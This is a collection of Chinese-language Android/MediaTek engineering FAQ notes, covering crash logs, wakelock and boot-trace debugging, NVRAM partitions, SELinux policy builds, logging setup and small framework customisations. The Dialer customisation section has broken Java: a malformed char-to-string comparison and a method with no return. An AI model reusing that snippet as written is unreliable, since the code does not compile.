01-04 03:15:30.424174  1994  2030 E AndroidRuntime: FATAL EXCEPTION: pool-3-thread-1
01-04 03:15:30.424174  1994  2030 E AndroidRuntime: Process: ru.appspress.android.eguarantee.bq, PID: 1994
01-04 03:15:30.424174  1994  2030 E AndroidRuntime: java.lang.IllegalStateException: Apps may not schedule more than 100 distinct jobs
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at android.os.Parcel.readException(Parcel.java:2013)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at android.os.Parcel.readException(Parcel.java:1951)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at android.app.job.IJobScheduler$Stub$Proxy.schedule(IJobScheduler.java:180)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at android.app.JobSchedulerImpl.schedule(JobSchedulerImpl.java:44)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at androidx.work.impl.background.systemjob.SystemJobScheduler.scheduleInternal(SystemJobScheduler.java:85)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at androidx.work.impl.background.systemjob.SystemJobScheduler.schedule(SystemJobScheduler.java:64)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at androidx.work.impl.Schedulers.scheduleInternal(Schedulers.java:98)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at androidx.work.impl.Schedulers.schedule(Schedulers.java:69)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at androidx.work.impl.WorkManagerImpl.rescheduleEligibleWork(WorkManagerImpl.java:398)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at androidx.work.impl.utils.ForceStopRunnable.run(ForceStopRunnable.java:66)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1162)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:636)
01-04 03:15:30.424174  1994  2030 E AndroidRuntime:     at java.lang.Thread.run(Thread.java:764)

java.lang.IllegalStateException: Apps may not schedule more than 100 distinct jobs
看起来是某些app使用job过多，属于APK issue。
贵司可以pull出data/system/job/jobs.xml ，查看到底是哪个APP使用job过多。

目前 job service 这边没有保护机制，之前的类似issue只是将jobs.xml 删除掉之后，暂时解决问题。 

如果某些app 恶意使用大量 job，目前看起来没好的方式避免。 
```

## 如何确认生成的某个so文件从哪里代码拷贝过去的?

```text
1、source build/envsetup.sh    --> 导入环境
2、godir fingerprint.default.so   --> 搜索这个文件的具体代码路径
3、md5sum fingerprint.default.so   --> 获取唯一值
5656a7e732354b53d1e3b1b67b12a67a  fingerprint.default.so
因为步骤2会搜索出好几个结果，那么如何确认是哪个路径拷贝的呢?首先先在out中找到对应的文件，然后用md5sum fingerprint.default.so 获取出唯一值，然后在把步骤2搜索出来的路径每个都用md5sum的命令去获取唯一值，然后相同的就是对应的文件路径
```

## [默认值] 如何修改wqhl导致的usb连接模式在重启后会不停变化

```text Java
frameworks/base/services/usb/java/com/android/server/usb/UsbDeviceManager.java 文件中 
trySetEnabledFunctions(String functions, boolean forceRestart) 方法内增加如下方法
if (functions.equals("adb")){
    functions = "mtp,adb";
}
```

## [debug] android 无法休眠查看，查看哪個wakelock擋到系統進入suspend的步驟

```text
1：检查userspace wakelock状态
dumpsys power
cat /sys/power/wake_lock

2：检查kernel wakelock状态
cat /sys/kernel/debug/wakeup_sources
查看actvie_since列，大于0的会导致无法suspend

cat /proc/wakelocks

#查看哪個wakelock擋到系統進入suspend的步驟

當測試者認為現在系統可以進入suspend(如暗屏+無接usb/ac充電)，系統卻還一直打印uart log。
su (讓uart console變成root權限)
每一秒執行cat /sys/kernel/debug/wakeup_sources一次，共5次左右，若有某個wakelock的active_since值一直在增加(如下表)，就是此wakelock擋到系統進入suspend。
若碰到是PowerManagerService.WakeLocks的active_since值一直在增加，則需要更進一步執行"dumpsys power"，查看是哪個PARTIAL_WAKE_LOCK擋到系統進入suspend。

#查看系統內有多少個wakelock - 範例

Command: cat /sys/kernel/debug/wakeup_sources

name active_count event_count wakeup_count expire_count active_since total_time max_time last_change prevent_suspend_time
PowerManagerService.Broadcasts 3 3 0 0 0 12408 10881 282326 0
PowerManagerService.WakeLocks 91 91 7 0 57415 177029 70793 269483 0
 
#查看PowerManagerService.WakeLocks裡哪個PARTIAL_WAKE_LOCK在使用，因此擋到系統進入suspend - 範例

Command: dumpsys power

Wake Locks: size=6 (PowerManagerService.WakeLocks裡有6個PARTIAL_WAKE_LOCK在使用，所以PowerManagerService.WakeLocks不能釋放，進而擋到系統進入suspend)
PARTIAL_WAKE_LOCK 'GnssLocationProvider' (uid=1000, pid=1100, ws=null)
PARTIAL_WAKE_LOCK 'CMWakeLock' (uid=10012, pid=1926, ws=WorkSource{10012 com.google.android.gms})
PARTIAL_WAKE_LOCK 'Checkin Service' (uid=10012, pid=2311, ws=WorkSource{10012 com.google.android.gms})
PARTIAL_WAKE_LOCK '*net_scheduler*' (uid=10012, pid=1926, ws=WorkSource{10083 com.google.android.youtube})
PARTIAL_WAKE_LOCK 'NetworkTimeUpdateService' (uid=1000, pid=1100, ws=null)
PARTIAL_WAKE_LOCK '*net_scheduler*' (uid=10012, pid=1926, ws=WorkSource{10012 com.google.android.gms})
```

## [NVRAM]  [FAQ20290] modem NvRAM 四个分区的基本知识

```text
nvdata：手机运行过程中，使用(读写)的NVRAM(除了存在protect_f和protect_s中的NVRAM)都是该分区的nvram文件。存储着普通NVRAM数据、 IMEI、barcode、Calibration数据等。对应的modem path是Z:\NVRAM。NVRAM目录下有CALIBRAT、NVD_DATA、NVD_CORE和NVD_IMEI四个目录，后续第三点会对这四个目录进行介绍。

protect_1、protect_2 ：一般我们也称为protect_f和protect_s分区，protect_s是对protect_f中部分NVRAM的复制。
主要存储着SIM Lock数据。具有NVRAM_CATEGORY_IMPORTANT_L4属性的NVRAM LID会存在protect_f分区(这个叫A file)，如果还具有NVRAM_ATTR_MULTIPLE属性(锁卡LID都有MULTIPLE属性)，会存一个B文件到protect_s中。正常情况下protect_f中的A文件和protect_s中的B文件是相同的，因为写的时候都会去写两只nvram文件。（同时这两个分区的两只文件是互为备份的[即如果A file损坏,可以使用B file的来还原、 B file损坏,使用A file来还原;但如果两只文件都被被异常破坏或者删除, nvram将让modem assert）.

nvram：一般我们也称为binregion分区，是一个备份分区，备份具有NVRAM_CATEGORY_IMPORTANT和NVRAM_CATEGORY_CALIBRAT属性的NVRAM LID，备份的也就是CALIBRAT和NVD_IMEI两个目录，具体有IMEI、 barcode、Calibration数据和4G RF driver参数这些NVRAM。备份可以由META Tool触发 ，ATE校准完会自动触发备份，SN Writer tool写完号后也会自动触发备份。
```

## [NVRAM] 升级方式对各个NVRAM分区的影响

```text
Format All+Download
会擦除所有分区，所有NVRAM LID都会用code中的默认值重新生成。全擦后只有触发备份过，binregion中才会有备份内容，否则binregion是空的(Flash默认的全0 or 全f)。

Firmware Upgrade 、Factory Reset(恢复出厂设置)
只会擦除nvdata分区，开机时AP会将binregion中备份的CALIBRAT和NVD_IMEI两个目录还原到nvdata分区。具体NVRAM LID是IMEI、 barcode、Calibration数据和4G RF driver参数。
protect_f和protect_s分区不会被擦除，所以SIM Lock保持不变。
其他NVRAM LID恢复为code中的默认值。
如果binregion是空的，那么IMEI、 barcode、Calibration数据和4G RF driver参数也会用code中的默认值重新生成。

Download Only、OTA、SD upgrade 、Push modem
不会擦除任何分区。这种升级方式下，如果有修改code中的default值，那么需要将相应NVRAM LID的VERNO+1，才会生效，即将会利用code中的默认值重新生成新文件。

注意：这里所说的所有分区和任何分区均指Modem NVRAM的四个分区：nvdata分区、 protect_f分区、protect_s分区和binregion分区。
```

## [log]  如何设置MTKlogger是否开机自启动

```text
1. 第一次开机MTKlogger是否开启
1) 配置prop文件:   true则开启，false则关闭 
com.mediatek.log.mobile.enabled = true/false
com.mediatek.log.modem.enabled = true/false
com.mediatek.log.net.enabled = true/false
com.mediatek.log.gps.enabled = true/false

2) prop文件路径
KK版本: alps/mediatek/external/xlog/tools/mtklog-config-eng.prop或mtklog-config-user.prop
L 版本:  alps/vendor/mediatek/proprietary/external/xlog/tools/mtklog-config-eng.prop或mtklog-config-user.prop
M/N/O/P版本:  alps/device/mediatek/common/mtklog/mtklog-config-bsp-eng.prop或mtklog-config-bsp-user.prop

2. 非第一次开机是否开启的配置方法有如下两种
1) 勾选Start Automatically进行设置
MTKlogger UI——》Settings——》MobileLog/ModemLog/NetworkLog/GPSLog——》Start Automatically

2) 通过adb发送广播设置
adb shell am broadcast -a com.mediatek.mtklogger.ADB_CMD -e cmd_name set_auto_start_1/set_auto_start_0 --ei   cmd_target 23
set_auto_start_1表示开启开机自启动, set_auto_start_0表示关闭开机自启动
cmd_target is a combination or just a single of each Log type
MobileLog: 1 ModemLog: 2 NetworkLog: 4 GPSLog: 16
```

## [log] 抓取开机trace

```text
1). Enables tracing during boot-up

     Android O: In frameworks/native/atrace/atrace.rc, change:
        write /sys/kernel/debug/tracing/tracing_on 0
        To:
        #write /sys/kernel/debug/tracing/tracing_on 0
        This enables tracing (which is disabled by default).

     Android P0: In frameworks/native/cmds/atrace/atrace.rc
        # Tracing disabled by default
        write /sys/kernel/debug/tracing/tracing_on 0
        To:
        # write /sys/kernel/debug/tracing/tracing_on 0


2). Set systrace tags
     In the device/mediatek/mt67××/device.mk file, add the following line:
        PRODUCT_PROPERTY_OVERRIDES += debug.atrace.tags.enableflags=0x1fe9fe
     For enableflags's bit, please refer to "system/core/include/cutils/trace.h"


3). Add ftrace tags which you wanted
     In the project's BoardConfig.mk file, add the following:
        BOARD_KERNEL_CMDLINE := ... trace_buf_size=64M trace_event=sched_wakeup,sched_switch,sched_blocked_reason,sched_wakeup_new,sched_waking,cpu_frequency,cpufreq_interactive,cpu_frequency_limits,cpu_idle
     For detailed I/O analysis, also add "block android_fs ext4..." trace tags
     If you want catch more trace log, you can increase trace_buf_size. But if the phone memory size is less then 1GB, you need reduce trace_buf_size, such as "trace_buf_size=32M" for 512MB devices.

4). Disable tracing after boot-up completed
     In the device-specific init.mt67**.rc file, make the following changes, such as:
        on property:sys.boot_completed=1 (this stops tracing on boot complete)
        write /sys/kernel/debug/tracing/tracing_on 0
        write /sys/kernel/debug/tracing/events/ext4/enable 0
        write /sys/kernel/debug/tracing/events/block/enable 0
        write /sys/kernel/debug/tracing/events/android_fs/enable 0

5). After boot up, fetch trace
     adb root && adb shell "cat /d/tracing/trace" > boot_trace 

6). Open trace
     Use chrome://tracing can open boot_trace
```

## [log] 从 Q0 开始 mtklog 改名了

```text
用户手册 http://dms.mediatek.inc/Explorer/index/238136/2
```

## [FAQ21836] Skia软件绘制基础知识介绍

```text
Android apk 里面的画图分为2D和3D两种：
2D是由Skia 来实现的，也就是我们在框架图上看到的SGL，SGL也会调用部分opengl 的内容来实现简单的3D效果；
3D部分是由OpenGL|ES实现的，OpenGL|ES是Opengl的嵌入式版本。具体请参考blog:https://blog.csdn.net/yili_xie/article/details/4803565
Skia绘制分三种，分别是：
skia软件绘制、skia硬件绘制和PDF绘制；
1)skia软件绘制执行的是SkbitmapDevice
2)Skia硬件绘制执行的是SkGpuDevice，SkiaGpuDevice实际上就是之前的openGL/HWUI绘制，从Android P开始，Android 取消OpenGL，改为Skia GL，走如下框图中的SkGpuDevice，SkGpuDevice下面同以前的OpenGL，不是今天的重点
3)PDF绘制执行的是SkPDFDevice，目前只遇到一个APK使用这种绘制方式
```

## [nvram]  [ota] 通过OTA升级 SVNumber

```text
通过OTA升级时，data分区的NVRAM文件并不会被清除，因此升级后SVN和data分区下的其他nvram数据前后都没有变化。
如果需要确保OTA升级后SVN值或某一nvram file更新为新版本默认值，那么有如下方法：

1. 对于非IMPORTANT data(IMEI\SIM ME LOCK属于IMPORTANT data), 可以通过更新NVRAM LID VERNO，确保前后版本的NVRAM LID VERNO不一样即可。
例如更新SVN值， SVN默认保存在NVRAM_EF_SYS_CACHE_OCTET_LID，因此需要做如下修改：
File: Nvram_editor_data_item.h(mcu\interface\service\nvram)
#define NVRAM_EF_SYS_CACHE_OCTET_LID_VERNO "004"
修订为:
#define NVRAM_EF_SYS_CACHE_OCTET_LID_VERNO "005"

2. 由于SVN值保存在NVRAM_EF_SYS_CACHE_OCTET_LID，该NVRAM LID中保存了其他system information（FLIGHTMODE_STATE，SIM_PLUS_SETTING，SVN，USB_BOOT_MODE，USB_TETHERING_MODE等），那么升级后这些值也会更新为新版本的默认值。
因此做到OTA升级后只更新SVN值，那么我们需要采取另外一种方法来实现。

在nvram init完成后进行客制化来写入新版本的SVN值，例如下：
FILE: custom_nvram_int_config.c(mcu\custom\service\nvram\) 
Function:custom_nvram_config(void) 

在custom_nvram_config接口内部添加写入SVN操作，demo code可以参考如下： 
kal_uint8 data[]  = {0x87, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00}; 
nvram_external_write_data (NVRAM_EF_SYS_CACHE_OCTET_LID, NVRAM_SYS_SVN, data, NVRAM_EF_SYS_CACHE_OCTET_SIZE); 

其中配置的0x87就是SVN，从nvram读取出来为'78',需要参考BCD编码方式来配置。
举例说明： 如果写入NV中的值为0x17,那么读取出来值为'71';如果写入NV中的值为0x35，那么读取出来的值为'53'.


也可以通过发送AT命令的方式更新
发送AT命令： AT+EGMR=1,9,"78"   //78即为需要设置的SVN
```

## [Browser] 如何客制化Android内置浏览器，使用其它应用打开某些特定的URL?

```text
请修改 DefaultBrowserUrlExt.java 或 OpxxBrowserUrlExt.java (仅对对应的运营商生效)的
public boolean redirectCustomerUrl(SharedPreference mPrefs)，
在这个函数中添加对特定URL特征的判断和处理并返回true，浏览器将不再处理该URL；
如果不是特定的URL则返回false，由浏览器处理。
```

## [Browser] webview的相关问题

```text
1.Mtk Webview的作用:
敝司内部load都是双webview配置。其中mtk webview主要是给mtk browser使用。里面主要是对browser一些必须功能的
支持，此外还有一些webview的bug fix

2.设置webview:
可以从settings选择默认使用的webview，通常设置为Android/Google webview。即其他APP使用webview时，会使
用默认配置

3.Mtk webview与chrome差别：
首先，chromium版本不同。Mtk webview基于chromium 58。
另外，chrome为google app，内部没有source，无法得知google的相关修改

4.双webview的使用:
双webview并不会引起其他问题，APP使用时会去拿默认配置，敝司并没有针对双webview的专门测项。
对于webview功能，可采用单webview的测试即可。
简单来说，内部采用双webview架构主要是支持Mtk browser的一些特殊测试需求。
对于mtk browser而言，无需设置mtk webview为默认项，启动时会优先使用mtk webview。
而其他APP只会使用默认配置的webview。即使手机中有两个webview，也不会造成其他APP同时加载两个
webview或者引起其他相关问题。

5.cts测试时webview的选择:
CTS应该没有对webview做要求。但是建议使用Google webview做CTS测试。
Google webview会不断升级，CTS case也可能会做针对性调整。
而MTK webview版本比较老，且无法同步升级。 CTS测试时，可以有两个webview。
会使用settings中设置的默认值,除mtk webview。

6.卸载mtk webview:
若有使用mtk browser,建议不要卸载mtk webview,MtkBrowser.apk搭配MtkWebView.apk，有些feature的改动会同
时涉及2个module
卸载方法:删除掉/vendor/mediatek/proprietary/apps/MtkWebView/Android.mk 及之前build出的apk再
full build,避免把之前的apk烧进去 
```

## [Dialer] 如何客制化长按"*","#"显示"P"，"W"

```text
M及之后的版本 DialpadFragment.java

1 在 DialpadFragment.java 的 onLongClick() 中添加如下代码：

case R.id.star: {
    removePreviousDigitIfPossible();
    keyPressed(KeyEvent.KEYCODE_P);
    mPressedDialpadKeys.remove(view);
    return true;
}

case R.id.pound: {
    removePreviousDigitIfPossible();
    keyPressed(KeyEvent.KEYCODE_W);
    stopTone();
    mPressedDialpadKeys.remove(view);
    return true;
}

2 (frameworks\base\telephon\java\android\telephony\PhoneNumberUtils.java)修改如下函数：

public static String convertKeypadLettersToDigits(String input) {
    if (input == null) {
        return input;
    }
    int len = input.length();
    if (len == 0) {
        return input;
    }
    char[]  out = input.toCharArray();
    for (int i = 0; i < len; i++) {
        char c = out[i] ;
        // If this char isn't in KEYPAD_MAP at all, just leave it alone.
        if(c=="P"||c=="W"||c==("p"||c=="w") {
            out[i]  = c;
        } else {
            out[i]  = (char) KEYPAD_MAP.get(c, c);
        }
    }
    return new String(out);
}
3.
public static String normalizeNumber(String phoneNumber) {
    if (phoneNumber == null) {
        return null;
    }
    StringBuilder sb = new StringBuilder();
    int len = phoneNumber.length();
    for (int i = 0; i < len; i++) {
        char c = phoneNumber.charAt(i);
        // Character.digit() supports ASCII and Unicode digits (fullwidth, Arabic-Indic, etc.)
        int digit = Character.digit(c, 10);
        if (digit != -1) {
            sb.append(digit);
        } else if (i == 0 && c == '+') {
            sb.append(c);
        } else if (c == 'p' || c == 'w' || c == 'P' || c == 'W') {
            Rlog.d(LOG_TAG,"normalizeNumber() remove letter (p w P W)");
        } else if ((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z')) {
            return normalizeNumber(PhoneNumberUtils.convertKeypadLettersToDigits(phoneNumber));
        }
    }
}
```

## [性能]  [FAQ20989]  How to make built-in APK compile filter with speed mode 开启应用加速

```text
./target/product/core.mk

# The set of packages we want to force 'speed' compilation on.
- PRODUCT_DEXPREOPT_SPEED_APPS += \
+ PRODUCT_DEXPREOPT_SPEED_APPS += MtkTeleService

查看是否生效
adb shell "dumpsys package com.**.** | grep compila -A1"

Dexopt state:[com.android.camera] 
path: /system/priv-app/Camera/Camera.apk
status: /system/priv-app/Camera/oat/arm64/Camera.odex [compilation_filter=speed, status=kOatUpToDate]    //compilation_filter=speed 表示已加速
```

## 应用加固厂商

```text
1、加固厂商：加固宝360、娜迦nagapt、梆梆bangcle、爱加密ijm、阿里、百度，盛大，腾讯，网秦通付盾
2、加固厂商对应的特征：
娜迦libchaosvmp.so,libddog.so,libfdog.co
爱加密libexec.so，libexemain.so
梆梆libsecexe.so,libsecmain.so,libDexHelper.so,libSecShell.so 
360libprotectClass.so,libjiagu.so
通付盾libegis.so
网秦libnqshield.so
百度libbaiduprotect.so
```

## [FAQ21073]  [Android 7.0] 切换阿拉伯语，QuickSetting界面图标左右翻转

```text
切换手机语言为阿拉伯语，下拉状态栏到Quicksetting界面，快捷图标左右翻转。

如果不想要这个左右翻转效果，修改方法如下：

frameworks/base/packages/SystemUI/src/com/android/systemui/qs/QSTile.java
-public boolean autoMirrorDrawable = true;
+public boolean autoMirrorDrawable = false;
```

## 无法同步正常的时区

```text
TimeUtils.getTimeZone() 返回NULL,导致无法得到正确的时区，导致调整时区失败。
vendor/mediatek/proprietary/frameworks/opt/telephony/src/java/com/mediatek/internal/telephony/MtkServiceStateTracker.java
中传给getTimeZone的参数中，zOffset=7200000 是以毫秒为单位传进去的参数，但是TimeUtils.java里面调用lookupTimeZoneByCountryAndOffset
时，需要以秒为单位来算时区的offset，这样就会导致返回NULL的TIMEZONE, 可以按下面的修改解决该问题
xref: /frameworks/base/core/java/android/util/TimeUtils.java
修改
private static android.icu.util.TimeZone getIcuTimeZone(int offset, boolean dst, long when, String country) {
    if (country == null) {
        return null;
    }
    android.icu.util.TimeZone bias = android.icu.util.TimeZone.getDefault();
    // 修改一下，这里需要传的单位是秒，而以前版本传给getIcuTimeZone是 offset都是以毫秒为单位的，而google 这里没有除1000,故返回NULL
    return TimeZoneFinder.getInstance().lookupTimeZoneByCountryAndOffset(country, offset/1000, dst, when, bias);
}
```

## [FAQ15121] Ubuntu 下 QT Flashtool 不能使用

```text
1, ubuntu shell cmd:  sudo apt-get purge modemmanager
2, Double confirm if the ModemManager is under the root directory /bin, if yes, remove it or rename the software.
3, Using configuration in udev to avoid USB device to be recognized as modem device.
    -- add the file "99-ttyacms.rules" in the path "/etc/udev/rules.d"
    -- add the following content in the file "99-ttyacms.rules"
    ATTRS{idVendor}=="0e8d", ENV{ID_MM_DEVICE_IGNORE}="1"

Note: If after that the QT flashtool still can not flash, there are some notics need to be checked also while download under ubuntu OS,
the detail please refer to [FAQ09734]  [FlashTool] Qt FlashTool在Linux下不能下载，提示S_COM_PROT_OPEN_FAIL
```

## [selinux]  [FAQ11483] 修改SeLinux policy之后快速验证

```text
在Android KK 4.4 版本后，Google 有正式有限制的启用SELinux, 来增强android 的安全保护。
KK 版本: 在MTK Solution 中，我们将SELinux Policy 文件存放在三个目录中。
1). Google 原生目录 alps/external/sepolicy
2). MTK 配置目录 alps/mediatek/custom/common/sepolicy
3). 客户配置目录 alps/mediatek/custom/{Project}/sepolicy (默认没有配置)
在编译时，系统会以文件为单位整合替换，优先级: 客户配置目录 》MTK 配置目录 》 Google 原生目录.

L/M版本: 将SELinux Policy 文件存放在下面目录。
1). Google 原生目录 alps/external/sepolicy
2). MTK 配置目录 alps/device/mediatek/common/sepolicy
3). MTK 配置目录 alps/device/mediatek/{platform}/sepolicy (M版本后才添加使用，主要是针对平台客制化)
在编译时, 系统会以合并的方式(union), 将MTK 配置目录下的policy 附加到Google 原生的policy 上，而非替换.
如果在alps/device/mediatek/common/sepolicy 下面新增SELinux Policy file, 在L 版本需要更新alps/device/mediatek/common/BoardConfig.mk 中的BROAD_SEPOLICY_UNION 增加对应的xxxx.te, M 版本已经取消了这个宏，无需再操作.

N 版本: 将SELinux Policy 文件存放在下面目录
1). Google 原生目录 alps/system/sepolicy
2). MTK 配置目录 alps/device/mediatek/common/sepolicy/  注意的是里面有basic, bsp, full 目录. 其中basic 目录所有的版本都会吃到; bsp 目录则是bsp 版本 + Turnkey 版本都会吃到;  full 目录则是只有Turnkey 版本会吃到。

O 版本: 将SELinux Policy 文件存放在下面目录
1). Google 原生目录 alps/system/sepolicy
2).  MTK 配置目录 alps/device/mediatek/sepolicy 这个的设定已经大改, 需要大家参考MOL 上的 sepolicy O 版本更新.

1). 确认问题是否与SELinux 相关，可以参考FAQ: [SELinux]  如何设置确认selinux 模式?

2). 快速编译验证

在已经编译过的版本上,  首先编译出新的selinux policy, 然后打包boot image.
KK:  ./mk project_name mm external/sepolicy
./mk project_name bootimage

L/M:
mmm external/sepolicy
make -j24 ramdisk-nodeps
make -j24 bootimage-nodeps

N:
mmm system/sepolicy
make -j24 ramdisk-nodeps
make -j24 bootimage-nodeps

然后再重新刷bootimage 测试.

O:
mmm system/sepolicy
然后再根据对应的sepolicy 是存放在system image, 还是 vendor image 对 system, vendor image 分别打包.


[相关FAQ] 
[FAQ11414]  android KK 4.4 版本后，user 版本su 权限严重被限制问题说明
[FAQ11486]  在Kernel Log 中出现"avc: denied" 要如何处理?
[FAQ11485]  权限(Permission denied)问题如何确认是Selinux 约束引起
[FAQ11484]  如何设置确认selinux 模式
```

## [debug]  [FAQ20658]  [Shutdown] 如何初步定位异常关机问题

## [FAQ18208]  [SAT] 如何不显示开机SIM卡欢迎语

## [FAQ20994]  Android O版本发送广播受限问题

## [FAQ20745]  Launcher无Notification Dots feature

```text
/vendor/mediatek/proprietary/packages/apps/Launcher3/src/com/android/launcher3/badge/BadgeRenderer.java
private static final boolean DOTS_ONLY = true;
修改为：
private static final boolean DOTS_ONLY = false;
```

## [FAQ20215]  如何动态关闭fast starting window??????fast starting window是什么东西???

```text
关闭方法如下,ENG版本有效
adb shell setprop debug.disable_fast_start_win 1
adb shell stop
adb shell start
```

## [FAQ20862]  介绍framework-res__auto_generated_rro.apk

```text
在Android O上面 Google增加了一个enforced RRO的方法，可以把之前的build time overlay强制转换成runtime resource overlay.
如果overlay的是framework-res的资源包，那么会自动生成一个file在/vendor/overlay/framework-res__auto_generated_rro.apk. 里面会包含overlay的资源.
这个framework-res__auto_generated_rro.apk.不要删除，请保留。
```

## [log]  [FAQ19034]  数据库权限问题分析

```text
应用报数据库相关错误，强制关闭
以01-01 08:05:07.572 E/SQLiteLog( 2276): (14) os_unix.c:30090: (13) open(/data/user/0/com.android.providers.calendar/databases/calendar.db)为例；

首先根据[FAQ11485]  [SELinux Debug] 权限(Permission denied)问题如何确认是Selinux 约束引起?
如是selinux引起，则请使用QAAT工具进行扫描log获取分析结果和解决方案；

如果不是selinux引起，则对比正常机器和异常机器的如下信息，看下差异点，
如有差异，则把正常机器修改为异常机器的内容；如果复现，则找到问题点； 

adb shell ls -aZl /data > 1.txt
adb shell ls -aZl /data/user > 2.txt
adb shell ls -aZl /data/user/0 > 3.txt
adb shell ls -aZl /data/user/0/com.android.providers.contacts > 4.txt
adb shell ls -aZl /data/user/0/com.android.providers.contacts/databases > 5.txt
adb shell ls -aZl /data/data > 6.txt
adb shell ls -aZl /data/data/com.android.providers.contacts > 7.txt
adb shell ls -aZl /data/data/com.android.providers.contacts/databases > 8.txt
adb shell mount > 9.txt
adb shell ps > 10.txt

对于问题点，如果没有复现问题的完整log，通常较难分析根本原因；
不过可以尝试recovery下的root-check，看下手机是否有被root或者image被破坏的可能；

对于案例的原因为：data下面的user文件夹权限被修改为：drwx------ root root （正常是：drwx--x--x system system），即访问A/B/C.txt，需要拥有A、B、C.txt三个权限。

对应的workaround为：
/system/core/rootdir/init.rc

on post-fs-data

mkdir /data/system/heapdump 0700 system system

mkdir /data/user 0711 system system //添加此行

对于其他DB的分析方法类似。。。
```

## [FAQ20741]  [FM] 如何做到可以在客户端卸载内置的FM

```text
如何做到可以在客户端卸载内置的FM? 

1.  O版本之前，需要 patch，可提eService 申请。
2.  patch之后(O后不需要)，需要按如下修改：

/vendor/mediatek/proprietary/frameworks/base/data/etc/pms_sysapp_removable_vendor_list.txt
添加： com.android.fmradio

/system/core/rootdir/etc/public.libraries.android.txt
添加 libfmjni.so

Add in /device/mediatek//device.mk
PRODUCT_PROPERTY_OVERRIDES += persist.sys.pms_sys_removable=1
```

## [log]  [FAQ20491]  [Android O]  AEE 在 Android O 上的变化以及提交log需要注意的问题

```text
在android o 中， systemimg 和vendorimg 中的daemon 不能直接通信，aee 为此在android O 上做出了一些变化；
导致在提case时，不能在第一时间提供全面的log信息；
 
一， AEE 的变化：
1. 架构的改变。
Before：
AEE只存在与system/bin/下，daemon的名字叫debuggerd(debuggerd64)
After:
AEE在system/bin和vendor/bin下各有一套，daemon名字改为：aee_aed(aee_aed64)---system/bin下；aee_aedv(aee_aedv64)---vendor/bin/下

2. 不同异常类型DB存放路径
Before：
/data/aee_exp;
/sdcard/mtklog/aee_exp;
After:
JE/ANR/SWT                           db存放在data/aee_exp
KE/HWT/HW_REBOOT/EE/NE   db存放在data/vendor/mtklog/aee_exp

3. 注意 注意：不能手动删除/data/aee_exp, /data/vendor/mtklog/aee_exp 目录：
aee db 存放路径 /data/aee_exp, /data/vendor/mtklog/aee_exp 的selinux标签如下， 这个标签是在init 创建目录的时候打下去的：
/data/aee_exp(/.*)? u:object_r:aee_exp_data_file:s0
/data/vendor/mtklog/aee_exp(/.*)? u:object_r:aee_exp_data_file:s0
如果删除aee db 的存放目录， 再创建的时候会沿用父目录的selinux 标签（ system_data_file），导致aee 没有selinux 权限不能正确产生db（重新开机后，init不会强制更新标签，还是会使用 system_data_file 的签名）；
solution：有root权限的手机有可能误删，会影响抓DB。解决办法，执行restorecon -R xxx/aee_exp命令即可

4. Android user load，如何抓到所有异常的aee db?
FAQ20159   Android user/userdebug load，如何抓到所有异常的aee db?

5. aee 对三方app exception handle的过滤
public void handle(String type, String info, String pid) {
    Log.w(TAG, "Exception Log handling...");
    if (type.startsWith("data_app") && !info.contains("com.android.development") && (SystemProperties.getInt("persist.mtk.aee.filter", 1) == 1)) {
        Log.w(TAG, "Skipped - do not care third party apk");
        return;
    }
aee 有对上层三方app 进行过滤， 如需抓三方app 的exception， 可以设置属性：setprop persist.mtk.aee.filter  0

6. user load ：三方app 默认不做ANR dump
1608    /**
1609     * Reduce the 3rd party's anr dump info in user load for performance
1610     */
1611    private boolean needReduceAnrDump(ApplicationInfo appInfo) {
1612        return IS_USER_LOAD && !isBuiltinApp(appInfo) && !(SystemProperties.getInt(
1613                "persist.anr.dumpthr",NORMAL_ANR_FLOW) == ENABLE_ANR_DUMP_FOR_3RD_APP);
1614    }
如需抓三方app 的ANR exception， 可以设置属性：setprop persist.anr.dumpthr  1

二， 提交log需要注意的问题
Android O ,mtklog 和db 不在同一个目录，提交log 时需要同时导出来：
1, adb pull /sdcard/mtklog
2, adb pull /data/aee_exp
3, adb pull /data/vendor/mtklog/aee_exp
```

## [debug]  [FAQ20659]  How to kill a native process and remake it re-launch

```text
user load开启android malloc debug机制，在设置property之后，需要将该进程kill并且重新re-launch

[SOLUTION] 

请在user load设置property之后，按以下步骤进行：

1.kill -9 pid(该进程的pid)
2.ps | grep processname(该进程的name)
如果该进程存在，则该进程在kill 掉之后自动re-launch了
3.如果该进程不存在，则setprop ctl.start processname(该进程的name)
4.ps | grep processname(该进程的name)
如果该进程存在，则重新re-launch了
```

## [debug]  [FAQ20594]  如何定位分析不开机及开机时间长问题

```text
1、客退机问题：请先参考DCC文档《RMA_SOP.pptx》进行初步定位，厘清软件问题还是硬件问题。
2、非客退机问题：
a、不能正常开机并且会自动重启：
请在eService的title和description中标注“重启”的信息，保留问题复现版本codebase及问题现场，提交eService处理；
b、开机卡住，不能进入HomeScreen，不发生重启：
请下载DCC文档《[SOP] Bootup_Issue_Checking_SOP_V1.0.rar》进行初步分析定位，如仍未解决还请填写文档中相关信息后提交eService处理（同步上传文档）；
c、开机时间长：
请下载DCC文档《[SOP] Bootup_Issue_Checking_SOP_V1.0.rar》进行初步分析定位，如仍未解决还请填写文档中相关信息后提交eService处理（同步上传文档）；
```

## [VPN]  [FAQ19293]  [Framework-VPN] 使用VPN 之前为何要设定lock screen PIN or password

```text
第一次使用vpn，在添加profile 的时候，系统会提示“You need to set a lock screen PIN or password before you can use credential storage”,有什么作用?可否去掉?
 
vpn 的信息都是需要加密的，在目前的设计里面，这个密码是用来加密要保存的账号信息的。如果去掉，账号信息很容易泄露，不建议去掉。

